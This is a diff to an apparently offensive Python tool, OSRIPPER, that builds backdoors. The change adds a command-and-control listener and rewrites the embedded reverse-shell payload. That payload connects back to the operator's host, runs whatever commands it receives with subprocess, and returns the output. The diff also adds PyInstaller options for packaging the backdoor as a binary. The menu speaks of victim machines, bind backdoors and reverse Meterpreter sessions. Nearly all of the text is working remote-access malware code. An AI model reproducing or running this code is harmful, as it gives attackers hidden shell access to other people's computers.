@@ -1,4 +1,5 @@
 import os
+import socket
 from pickle import GLOBAL
 logo = """
 
@@ -47,12 +48,62 @@ logo = """
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-                                                                           OSRIPPER v0.1.1
+                                                                           OSRIPPER v0.1.3
 """
 
 clear = lambda: os.system('cls')
 clear()
 print(logo)
+def listen(host, port):
+
+    SERVER_HOST = host
+    SERVER_PORT = int(port)
+    # send 1024 (1kb) a time (as buffer size)
+    BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
+    # separator string for sending 2 messages in one go
+    SEPARATOR = "<sep>"
+
+    # create a socket object
+    s = socket.socket()
+
+    # bind the socket to all IP addresses of this host
+    s.bind((SERVER_HOST, SERVER_PORT))
+    # make the PORT reusable
+    # when you run the server multiple times in Linux, Address already in use error will raise
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.listen(5)
+    print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
+
+    # accept any connections attempted
+    client_socket, client_address = s.accept()
+    print(f"{client_address[0]}:{client_address[1]} Connected!")
+
+    # receiving the current working directory of the client
+    cwd = client_socket.recv(BUFFER_SIZE).decode()
+    print("[+] Current working directory:", cwd)
+
+    while True:
+        # get the command from prompt
+        command = input(f"{cwd} $> ")
+        if not command.strip():
+            # empty command
+            continue
+        # send the command to the client
+        client_socket.send(command.encode())
+        if command.lower() == "exit":
+            # if the command is exit, just break out of the loop
+            break
+        # retrieve command results
+        output = client_socket.recv(BUFFER_SIZE).decode()
+        print("output:", output)
+        # split command output and current directory
+        results, cwd = output.split(SEPARATOR)
+        # print output
+        print(results)
+    # close connection to the client
+    client_socket.close()
+    # close server connection
+    s.close()
 def gen_bind():
     global name
     name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
@@ -85,25 +136,49 @@ def gen_rev():
         ina.write("\n")
         ina.write('hototo = "'+str(host)+'"')
         b = '''
-import socket as s
-import subprocess as r
-from time import sleep
-from urllib3 import Retry
-def main():
-    so=s.socket(s.AF_INET,s.SOCK_STREAM)
-    try:
-        so.connect((hototo,port))
-        while True:
-            d=so.recv(1024)
-            if len(d)==0:
-                break
-            p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
-            o=p.stdout.read()+p.stderr.read()
-            so.send(o)
-    except ConnectionRefusedError:
-        sleep(5)
-        main()
-main()        
+import socket
+import os
+import subprocess
+import sys
+
+SERVER_HOST = hototo
+SERVER_PORT = port
+BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
+# separator string for sending 2 messages in one go
+SEPARATOR = "<sep>"
+
+# create the socket object
+s = socket.socket()
+# connect to the server
+s.connect((SERVER_HOST, SERVER_PORT))
+# get the current directory
+cwd = os.getcwd()
+s.send(cwd.encode())
+
+while True:
+    # receive the command from the server
+    command = s.recv(BUFFER_SIZE).decode()
+    splited_command = command.split()
+    if command.lower() == "exit":
+        break
+    if splited_command[0].lower() == "cd":
+        try:
+            os.chdir(' '.join(splited_command[1:]))
+        except FileNotFoundError as e:
+            output = str(e)
+        else:
+            # if operation is successful, empty message
+            output = ""
+    else:
+        # execute the command and retrieve the results
+        output = subprocess.getoutput(command)
+    # get the current working directory as output
+    cwd = os.getcwd()
+    # send the results back to the server
+    message = f"{output}{SEPARATOR}{cwd}"
+    s.send(message.encode())
+# close client connection
+s.close()     
                     '''
         ina.write(b)
         ina.close
@@ -142,11 +217,11 @@ def postgen():
         compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
         if compiling == 'y':
             if encrypted == True:
-                compcomd = 'pyinstaller -F --hidden-import imp '+name+'_enc.py'
+                compcomd = 'pyinstaller -F --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name+'_enc.py'
                 os.system(compcomd)
                 print('Saved under "dist" folder')
             else:
-                compcomd = 'pyinstaller -F --hidden-import imp '+name
+                compcomd = 'pyinstaller -F --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name
                 os.system(compcomd)
                 os.system(clear)
                 print(logo)
@@ -156,6 +231,8 @@ print("""BackDoor Module
         1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
         2. Create Reverse Shell (TCP (Encryption not recommended)) (Connects back to you)
         3. Create Reverse Meterpreter (HTTP) (Connects back to you)
+        4. Open a listener
+        
 
 """)  
 encrypted = False     
@@ -169,3 +246,6 @@ if nscan == "2":
 if nscan == "3":
     gen_rev_http()
     postgen()
+if nscan == '4':
+    port = int(input('Please enter the port u want to listen on: '))
+    listen('0.0.0.0', port)
